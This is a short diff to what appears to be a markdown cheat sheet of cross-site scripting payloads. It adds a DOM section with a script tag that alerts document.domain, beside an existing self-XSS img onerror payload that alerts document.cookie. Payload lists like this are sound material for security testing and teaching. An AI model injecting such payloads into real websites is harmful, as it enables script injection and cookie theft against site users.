@@ -1,3 +1,7 @@
+## DOM
+```
+<script>alert(document.domain)</script>
+```
 ## Self Cross-Site Scripting 
 ```mysql
 <img src="" onerror="alert(document.cookie)">
